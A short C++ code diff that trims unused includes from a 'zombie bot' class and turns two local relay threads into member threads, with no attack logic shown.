@@ -1,7 +1,4 @@
 #include <iostream>
-#include <math.h>
-#include <thread>
-#include <vector>
 #include "bot-zombie.hpp"
 #include "main.hpp"
 
@@ -12,8 +9,8 @@ void bot_zombie::run() {
 	std::cout << std::endl << "     Zombie bot loaded     " << std::endl;
 	std::cout << std::endl << "===========================" << std::endl;
 
-	std::thread relay_server_thread(&bot_zombie::relay_server, this);
-	std::thread relay_master_thread(&bot_zombie::relay_master, this);
+	relay_server_thread = std::thread(&bot_zombie::relay_server, this);
+	relay_master_thread = std::thread(&bot_zombie::relay_master, this);
 
 	getchar();
 
